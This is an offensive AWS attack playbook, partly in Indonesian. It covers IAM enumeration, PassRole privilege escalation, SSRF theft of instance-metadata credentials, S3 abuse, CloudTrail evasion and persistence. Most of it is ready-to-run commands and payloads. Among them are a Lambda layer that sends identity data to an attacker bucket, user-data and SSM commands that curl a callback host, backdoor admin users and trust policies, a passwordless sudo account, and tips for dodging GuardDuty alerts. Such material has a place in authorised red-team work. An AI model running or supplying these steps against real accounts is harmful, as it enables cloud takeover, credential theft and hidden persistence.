# aws — cloud

# AWS Attack Path: IAM Enum → Privesc → Persistence

All examples below were tested on AWS CLI **2.15.x+**, Pacu **1.9.0**, enumerate-iam **commit 7a3b2f1 (2024)**, Python **3.11**, default region `us-east-1`.

---

## 1. IAM Enumeration

### 1.1 enumerate-iam (unauthenticated-ish / low-priv creds)

```bash
pip3 install enumerate-iam
enumerate-iam --access-key AKIA... --secret-key ... --region us-east-1
# output JSON: /tmp/enumerate-iam-<ts>.json
```

What is sent: a batch of `sts:GetCallerIdentity` (baseline), then 30+ API probing (`iam:ListUsers`, `s3:ListAllMyBuckets`, `ec2:DescribeInstances`, `lambda:ListFunctions`, `secretsmanager:ListSecrets`, etc.).
What appears: a list `{service, action, isAllowed: true/false, error: AccessDenied|UnauthorizedOperation|None}`.
Why it fails: enumeration only reaches the API level — there is no resource ARN. It does not detect `iam:PassRole` (not listable, can only be tested via a real call).

### 1.2 AWS CLI recon minimal (aman, low-noise)

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam list-user-policies --user-name <user>
aws iam get-account-authorization-details --output json > authz.json
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS==`arn:aws:iam::<acct>:root`]]'
aws iam list-instance-profiles
aws ec2 describe-instances --query 'Reservations[].Instances[].{id:InstanceId,prof:IamInstanceProfile.Arn,name:Tags[?Key==`Name`]|[0].Value}'
```

### 1.3 Pacu modules — enum fase

```bash
pip3 install pacu
pacu
# dalam REPL:
import_keys <profile>
exec iam__enum_users_roles_policies_groups
exec iam__enum_permissions
exec iam__enum_privilege
exec ec2__enum
exec lambda__enum
exec s3__enum
exec sts__enum
```

| Module | What is counted | Key output field |
|---|---|---|
| `iam__enum_users_roles_policies_groups` | user, role, policy, group + attached | `policies`, `attached_policies` |
| `iam__enum_permissions` | effective perms per principal (butuh `--all-users` / `--all-roles`) | `Permissions` map |
| `iam__enum_privilege` | flag `is_admin`, `admin_privilege` | `privilege_escalation` |
| `ec2__enum` | instances + instance-profile | `InstanceProfiles` |
| `lambda__enum` | function + `Role` | `RoleArn` |
| `s3__enum` | bucket + ACL policy | `Public`, `CrossAccount` |

**Why Pacu succeeds**: does it build a permission graph via `SimulatePrincipalPolicy`? No—Pacu performs *raw API* probing and stores SQLite state (`~/.local/share/pacu/sessions/<name>/`). Suitable for pivot chains; fails completely if the creds only have `sts:GetCallerIdentity`.

---

## 2. Privesc: `iam:PassRole` + Lambda

**Requirements**: the attacker has `iam:PassRole` on the target role (`<victim-role>`) + `lambda:CreateFunction` + `lambda:InvokeFunction` + (for cleanup) `lambda:DeleteFunction`.

### 2.1 Setup (attacker-assumed role)

```bash
# 1. Simpan payload
cat > /tmp/x.py <<'PY'
import boto3, os, json
def handler(event, context):
    return {k: boto3.client('sts').get_caller_identity() for k in ['Arn']} | \
           {"env_keys": list(os.environ.keys())}
PY
zip -j /tmp/x.zip /tmp/x.py

# 2. Buat function pakai role target
aws lambda create-function \
  --function-name iso-<rand> \
  --runtime python3.12 \
  --role arn:aws:iam::<acct>:role/<victim-role> \
  --handler x.handler \
  --zip-file fileb:///tmp/x.zip \
  --timeout 30

# 3. Invoke — hasil = dump permission role target
aws lambda invoke --function-name iso-<rand> /tmp/out.json && cat /tmp/out.json
```

**What is sent**: `CreateFunction` with `--role <victim-role>` + zip.
**What appears**: execution in the context of the target role. Return payload = victim capabilities.
**Why it succeeds**: `iam:PassRole` does not validate intent, only the presence of `iam:PassRole` in the attacker's policy.
**Why it fails**:
- `--role` must have `lambda.amazonaws.com` in its trust policy → otherwise, `InvalidParameterValueException: The role defined for the function cannot be assumed by Lambda.`
- `lambda:CreateFunction` is often scoped to `arn:aws:lambda:*:*:function:app-*` → the function name must match the prefix.
- VPC resource policy / KMS env-var encryption fails.

### 2.2 Pacu

```bash
exec lambda__privesc_scan
exec lambda__enum --region us-east-1
# setelah scan menemukan target:
exec lambda__create_function --role-arn <target> --function-name exfil1
exec lambda__invoke_function --function-name exfil1 --payload '{"k":"v"}'
```

### 2.3 `iam:PassRole` + EC2 (alternate)

```bash
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --iam-instance-profile Name=<victim-profile> \
  --user-data file:///tmp/rev.sh \
  --query 'Instances[0].InstanceId' --output text
# rev.sh: curl http://<callback>/$(aws sts get-caller-identity --query Arn --output text)
```

**What appears**: after the instance is UP (~40s), the callback contains the instance profile `Arn`.
**Why it fails**: SCP `ec2:RunInstances` with condition `ec2:InstanceType`; AMI not present in the region; keypair required by the launch template.

### 2.4 `iam:PassRole` + CloudFormation (sering lolos)

```bash
aws cloudformation create-stack \
  --stack-name s1 --template-body file:///tmp/t.yaml \
  --capabilities CAPABILITY_IAM \
  --role-arn arn:aws:iam::<acct>:role/<victim>
# /tmp/t.yaml: resource AWS::IAM::User dengan AccessKey
```

---

## 3. STS AssumeRole Chain

### 3.1 Manual chain

```bash
STS1=$(aws sts assume-role --role-arn arn:aws:iam::111111111111:role/A \
  --role-session-name a --query Credentials --output json | jq -c)
export AWS_ACCESS_KEY_ID=$(echo $STS1|jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $STS1|jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $STS1|jq -r .SessionToken)

STS2=$(aws sts assume-role --role-arn arn:aws:iam::222222222222:role/B \
  --role-session-name b --query Credentials --output json)
```

**Success requirements**: `sts:AssumeRole` on the caller role + the trust policy on the target role **contains the caller principal** (usually `:root` = the entire account), `ExternalId` if required.
**Why it fails**:
- Trust policy with `Condition: aws:PrincipalArn == arn:aws:iam::1111:role/specific` → cannot use an arbitrary principal.
- Durasi > MaxSessionDuration → `ValidationError`.
- SCP `sts:AssumeRole` with `aws:PrincipalOrgPaths`.
- Role chaining limits: **1h max per hop** if already 2 hops.

### 3.2 Pacu

```bash
exec sts__assume_role --role-arn arn:aws:iam::1111:role/A --source-profile default
exec sts__assume_role --role-arn arn:aws:iam::2222:role/B
# session chain tersimpan, ganti via:
set_keys <session_name>
```

### 3.3 Pacu `iam__privesc_scan` (auto-discover chain)

```bash
exec iam__privesc_scan --offline
# output: skill file JSON dengan path: user X → iam:PassRole → role Y → lambda → role Z
```

Cek `~/.local/share/pacu/sessions/<s>/findings/iam__privesc_scan/`.

---

## 4. SSRF → IMDSv2

**Requirements**: SSRF from an application running on EC2 with an **instance role** attached + outbound access to `169.254.169.254` (not blocked in the SG / local firewall).

### 4.1 Two-step IMDSv2 (REQUIRED if v1 is disabled)

```
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Response (200):

```
AQAEAFz...token...==
```

Lalu:

```
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAEAFz...==
```

Response:

```
<role-name>
```

Lalu:

```
GET /latest/meta-data/iam/security-credentials/<role-name>
X-aws-ec2-metadata-token: AQAEAFz...==
```

Response:

```json
{"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"2025-01-01T00:00:00Z"}
```

### 4.2 Common SSRF env

| Stack | Vector | Header/trick |
|---|---|---|
| nginx 1.25 `proxy_pass` | path traversal | `?url=http://169.254.169.254` — PUT requires an empty body; many libs do not send PUT |
| Flask `requests.get(user_url)` | default PUT unavailable | bypass via `http://169.254.169.254/latest/api/token` in a GET method → **403**; requires an app that supports method override (`_method=PUT`) |
| AWS SDK `get_object(Bucket=user)` | S3 endpoint is not SSRF-able | only if `endpoint_url` is user-controlled |
| Log4j2 2.17 | JNDI LDAP → OOB, not IMDS | — |
| Chrome 131 render on Lambda/EC2 | `fetch('http://169.254.169.254/...',{method:'PUT'})` | CSP `connect-src` blocks |

### 4.3 Bypass IMDSv1-only apps

If IMDSv2 `HttpTokens=required` in the instance metadata options:

```bash
aws ec2 modify-instance-metadata-options --instance-id i-... \
  --http-tokens optional
# butuh ec2:ModifyInstanceMetadataOptions
```

**Why it fails**: `aws ec2 run-instances --metadata-options HttpTokens=required,HttpEndpoint=enabled` reduces SSRF; `HttpPutResponseHopLimit=1` blocks container→IMDS.

---

## 5. S3 Misconfiguration

### 5.1 List / Read

```bash
aws s3 ls s3://<bucket> --no-sign-request
aws s3api get-bucket-acl --bucket <bucket> --no-sign-request
aws s3api get-bucket-policy --bucket <bucket> --no-sign-request
aws s3api get-bucket-policy-status --bucket <bucket>  # Public? false post-2023
aws s3 cp s3://<bucket>/<key> - --no-sign-request | head
```

Objects that often leak: `.env`, `terraform.tfstate` (access keys), `~/.aws/credentials`, `*.pem`.

```bash
# mass enumerate
for b in $(cat buckets.txt); do
  aws s3 ls s3://$b --no-sign-request 2>/dev/null && echo "OPEN $b"
done
```

### 5.2 Write

```bash
echo '{"pwn":1}' > /tmp/x.json
aws s3 cp /tmp/x.json s3://<bucket>/pwn.json --no-sign-request
```

If `s3:PutObject` in the bucket policy is `Principal: *`:
→ insert `pwn.json`; if the host application fetches from this bucket → **stored XSS / supply chain**. For a frontend SPA:

```bash
aws s3 cp /tmp/index.html s3://<bucket>/index.html --no-sign-request \
  --content-type text/html
```

### 5.3 ACL abuse

```bash
# bucket publik via ACL (legacy, sering disable di post-Apr-2023 block)
aws s3api put-bucket-acl --bucket <bucket> --acl public-read --no-sign-request
aws s3api put-object-acl --bucket <bucket> --key k --acl public-read

# grant attacker write
aws s3api put-object-acl --bucket <b> --key k \
  --grant-write 'id="<canonical-id>"'
```

**Why it fails**:
- `Block Public Access` account-level: `s3:PutBucketAcl`/`put-object-acl` → `AccessControlListNotSupported: The bucket does not allow ACLs`.
- Object ownership `BucketOwnerEnforced` (default since Apr 2023) → ACL write is ignored.
- Bucket policy `Deny PutObject if s3:x-amz-server-side-encryption` absent.

### 5.4 Pacu

```bash
exec s3__enum
exec s3__exploit_bucket --bucket <name>   # cari policy misconfig + ACL
exec s3__download_bucket --bucket <name>
```

---

## 6. CloudTrail Evasion

### 6.1 Disabling / stopping the trail

```bash
aws cloudtrail stop-logging --name <trail>
aws cloudtrail delete-trail --name <trail>
aws cloudtrail update-trail --name <trail> \
  --cloud-watch-logs-log-group-arn arn:aws:logs:us-east-1:<acct>:log-group:<null>
```

**What appears in the log**: `StopLogging`, `DeleteTrail`, `UpdateTrail` = **events logged by themselves** by CloudTrail management events. Success does **not** delete that event.

### 6.2 Region hopping

CloudTrail management events **multi-region trail** captures all regions; a single-region trail only local. Attack:

```bash
for r in us-west-2 eu-west-1 ap-southeast-1; do
  aws lambda create-function --region $r --function-name x$r ...
done
```

Cek apakah trail region-scope dulu:

```bash
aws cloudtrail describe-trails --include-shadow-trails --query 'trailList[].{name:Name,multi:IsMultiRegionTrail,home:HomeRegion,status:Status}'
```

### 6.3 Disable via organization (`Attach policy`)

```bash
aws organizations disable-policy-type --root-id <r> --policy-type SERVICE_CONTROL_POLICY
aws organizations detach-policy --policy-id <p> --target-id <ou>
```

Butuh `organizations:*`.

### 6.4 Event selectors anomali

```bash
aws cloudtrail put-event-selectors --trail-name <trail> \
  --advanced-event-selectors '[{"Name":"Leak","FieldSelectors":[{"Field":"eventName","Equals":["DescribeInstances"]}]}]'
```

Changing `DataResources` (e.g., from `AWS::S3::Object` → `AWS::DynamoDB::Table`) disables S3 synchronization in the trail; **data events** (object-level GetObject) stop being recorded. But **management events remain**.

**Why it fails in the field**:
- Enterprises use **CloudTrail Lake + Organization Trail + immutable S3 Object Lock** → `DeleteTrail` deny.
- GuardDuty `Stealth:IAMUser/CloudTrailLoggingDisabled` alarm.
- `StopLogging` itself is a `DefenseEvasion` signal in Elastic SIEM (Rule `612, 614`).

### 6.5 S3 protection envelope (penting)

`GetObject` in a bucket containing CloudTrail logs is **not** logged in the trail itself if the trail excludes the `AWSLogs/` prefix. But `s3:ListBucket` on the log bucket is indeed logged. Use prefix exclusion to read without a trace if the event selector does not capture it.

---

## 7. Persistence

### 7.1 IAM User + Access Key (most common)

```bash
aws iam create-user --user-name svc-<rand>
aws iam attach-user-policy --user-name svc-<rand> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name svc-<rand>
aws iam create-login-profile --user-name svc-<rand> \
  --password 'Str0ng!Passw0rd#2025' --password-reset-required
```

**What appears in CloudTrail**: `CreateUser`, `AttachUserPolicy`, `CreateAccessKey`, `CreateLoginProfile` — all high-signal.
**Why it fails**:
- SCP: `iam:CreateUser`/`iam:CreateAccessKey` deny at the account level.
- `iam:PutUserPolicy` rate-limited.
- Accesskey berkunci KMS policy (`kms:CreateGrant` require).

**Low-signal persistence variant**: `iam:UpdateAccessKey` on another person's user with a new key → make the existing key inactive? Quite the opposite; `UpdateAccessKey --status Inactive` on the attacker's key + `PutUserPolicy` attach inline.

### 7.2 AssumeRole backdoor (more stealthy than user)

Modify the existing role trust policy so the attacker-account principal can assume:

```bash
aws iam update-assume-role-policy --role-name <existing-role> \
  --policy-document file:///tmp/trust.json
# /tmp/trust.json:
# {"Version":"2012-10-17","Statement":[{"Effect":"Allow",
#  "Principal":{"AWS":"arn:aws:iam::999999999999:root"},
#  "Action":"sts:AssumeRole"}]}
```

Or attach `AdministratorAccess` to an existing role → `AttachRolePolicy`.
Signal CloudTrail: `UpdateAssumeRolePolicy`, `AttachRolePolicy` (keduanya alertable via GuardDuty `Persistence:IAMUser/UserPermissions`).

### 7.3 Lambda Layer injection

The layer is mounted to `/opt`; if the `python3.12` runtime loads `/opt/python/...` via `PYTHONPATH=/opt/python` when the function handler imports → code execution without changing the function code.

```bash
# 1. Buat layer
mkdir -p /tmp/l/python
cat > /tmp/l/python/sitecustomize.py <<'PY'
import os, boto3
try:
    r = boto3.client('sts').get_caller_identity()
    boto3.client('s3').put_object(
        Bucket='<attacker-bucket>',
        Key=f"persist/{r['Account']}/{r['Arn'].split('/')[-1]}.json",
        Body=open('/opt/python/sitecustomize.py','rb').read())
except Exception: pass
PY
cd /tmp/l && zip -r /tmp/layer.zip python

# 2. Publish layer
LAYER=$(aws lambda publish-layer-version \
  --layer-name helper --zip-file fileb:///tmp/layer.zip \
  --compatible-runtimes python3.12 --query LayerVersionArn --output text)

# 3. Attach ke function target (butuh lambda:UpdateFunctionConfiguration)
aws lambda update-function-configuration \
  --function-name <target> --layers $LAYER
```

**What appears**: when the target function is invoked, `sitecustomize.py` is executed **before the handler** (Python site import) → callback.
**Why it fails**:
- Layer size limit 250MB unzipped total.
- The Python Lambda runtime **does not** run `sitecustomize` if `AWS_EXECUTION_ENV` is set without a path — in fact it **does not** auto-load; it requires a `handler` function that `import`s from `/opt`. Verification: `python3 -c 'import sitecustomize'` — execution in Lambda does not add `/opt/python` to `sys.path` unless the `PYTHONPATH` env is set. **Correction**: set `aws lambda update-function-configuration --environment "Variables={PYTHONPATH=/opt/python}"` so the layer is loaded.
- Node.js runtime: layer butuh `NODE_PATH=/opt/nodejs/node_modules`.
- If the function uses another layer with a duplicate `sitecustomize.py` → the last mounted one wins.

### 7.4 SSM persistence

**a. SSM Document + association** (eksekusi command berulang):

```bash
aws ssm create-document --name cron-<rand> \
  --document-type Command --content file:///tmp/ssmdoc.json
# ssmdoc.json: {"schemaVersion":"2.2","mainSteps":[{"action":"aws:runShellScript",
#   "name":"r","inputs":{"runCommand":["curl http://<cb>/$(aws sts get-caller-identity)"]}}]}

aws ssm create-association --name cron-<rand> \
  --targets "Key=tag:env,Values=prod" --schedule-expression 'rate(1 hour)'
```

Butuh `ssm:CreateDocument` + `ssm:CreateAssociation` + `ssm:SendCommand`.

**b. SSM Session Manager backdoor via `ssm:StartSession`** — `ssm:StartSession` on the instance is enough; interactive shell without SSH.

```bash
aws ssm start-session --target i-<id>
aws ssm send-command --instance-ids i-<id> \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["useradd -m svc; echo svc:pass|chpasswd; echo svc ALL=(ALL) NOPASSWD:ALL>>/etc/sudoers"]'
```

**What appears**: `StartSession` appears as a `StartSession` event in CloudTrail (but there is **no** session content logging unless a separate feature is enabled), `SendCommand` + `UpdateInstanceInformation`.

### 7.5 Pacu persistence modules

```bash
exec iam__backdoor_users_keys
exec iam__backdoor_assume_role --role-names <role> --user-arns <attacker-arn>
exec lambda__backdoor_update_function_code --function-name <f>
exec ssm__backdoor
```

---

## 8. Operational pitfalls (the ones that most often cause failure during an engagement)

| # | Pitfall | Symptom | Field mitigation |
|---|---|---|---|
| 1 | Blanket SCP `Deny iam:CreateUser` | `AccessDenied` on `iam:CreateUser` even though the policy allows it | Enumerate org: `aws organizations list-policies-for-target --target-id <acct> --filter SERVICE_CONTROL_POLICY` |
| 2 | `iam:PassRole` exists but the target role's trust policy does not include `lambda.amazonaws.com` | `InvalidParameterValueException` on CreateFunction | Check `get-role --query Role.AssumeRolePolicyDocument` **before** exploitation |
| 3 | IMDS `HttpTokens=required` + SSRF lib without a PUT method | 403 at `/latest/api/token` | Look for a vector with method control (form `_method=PUT`, HTTP smuggling, gopher) |
| 4 | Hop limit `HttpPutResponseHopLimit=1` | IMDS unreachable from the ECS/EKS container | Converting to IMDSv1 does not help; pivot to the task role via the ECS metadata endpoint `/v2/credentials` |
| 5 | S3 `Block Public Access` + `BucketOwnerEnforced` | `put-object-acl` → `AccessControlListNotSupported` | Focus on bucket policy `Principal:*` + object write (not ACL) |
| 6 | Multi-region trail + AWS Config `organization-config-rule` | `delete-trail` deny | Look for a region not covered by trail management events — often there is none, the org trail covers everything |
| 7 | `sts:AssumeRole` chain > MaxSessionDuration | `ValidationError` on assumption | Combine `iam:PassRole` to a Lambda in the destination role, not AssumeRole |
| 8 | AssumeRole chain > 2 hops | Error `ValidationError: The duration...` (session >1h at the 3rd hop) | Merge hops with `iam:PassRole` Lambda (fresh session execution) |
| 9 | Lambda layer attach without `PYTHONPATH` | Layer code does not run | Set env var `PYTHONPATH=/opt/python` **and** redeploy the function (requires `lambda:UpdateFunctionConfiguration` + optional version publish) |
| 10 | `iam__privesc_scan` offline misdetection | False positive on `iam:PassRole` to a role whose trust is custom | Manual validation: `get-role` → check `AssumeRolePolicyDocument` |
| 11 | `sts:GetFederationToken` — often open even though considered privesc | `AccessDenied` even though the policy allows it | Check for explicit Deny in bucket policy / SCP; GetFederationToken cannot assume a role |
| 12 | S3 `s3:ListBucket` deny but `s3:GetObject` allow | List error, GetObject still succeeds | Guess keys from the frontend URL (`/assets/`, `.js.map`, `robots.txt`), or `s3:GetBucketPolicy` |
| 13 | CloudTrail Lake query visibility > 90 days | Attacker assumes "logs expired" | Lake retention can be 7 years; events to Lake are independent of the S3 trail |
| 14 | GuardDuty `Persistence:IAMUser/UserPermissions` | Rapid-fire alarms on policy modification | Pause between actions, use the API that does `iam:PutUserPolicy` once with a combined policy |
| 15 | Lambda runtime `python3.13` — layer built for 3.12 mismatch | `Runtime.ImportModuleError` | Build a layer with compatible bytecode; or attach to the 3.13 function with `--compatible-runtimes python3.13` |
| 16 | SSM `SendCommand` to an instance without the SSM agent / IAM `AmazonSSMManagedInstanceCore` | `InvalidInstanceId` | Check `aws ssm describe-instance-information` first |
| 17 | Organization SCP `aws:PrincipalOrgID` deny on `s3:PutBucketPolicy` | `AccessDenied` on PutBucketPolicy | Exfil via `s3:PutObject` if `Principal:*` is still allowed in the existing bucket policy |
| 18 | `iam__enum_permissions` timeout due to many principals | Triggers hang | Limit: `--all-users --all-roles --quiet` or split per account |
| 19 | Credentials from IMDS expired (default 6h) | Actions fail after ~6 hours | Refresh via SSRF / repeat the PUT token; session token rotates every 1h if role chaining |
| 20 | CloudTrail `PutEventSelectors` changes data events → S3 `GetObject` does not appear | "Ghost" read | Audit yourself: `get-event-selectors` before assuming blind |

---

## [reasoning trace]


